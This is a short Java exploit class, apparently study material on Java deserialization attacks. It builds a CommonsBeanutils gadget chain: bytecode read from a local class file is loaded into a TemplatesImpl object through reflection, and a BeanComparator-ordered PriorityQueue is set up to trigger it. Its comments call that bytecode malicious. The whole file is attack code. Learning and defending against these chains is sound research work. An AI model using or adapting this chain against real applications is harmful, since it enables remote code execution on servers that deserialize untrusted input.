import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class PriorityEXP {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("E:\\JavaClass\\TemplatesBytes.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "Calc");
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
    //    templates.newTransformer();
        final BeanComparator beanComparator = new BeanComparator();
        // 将 property 的值赋为 outputProperties
        setFieldValue(beanComparator, "property", "outputProperties");
        // 创建新的队列，并添加恶意字节码
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(templates);
        queue.add(templates);
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
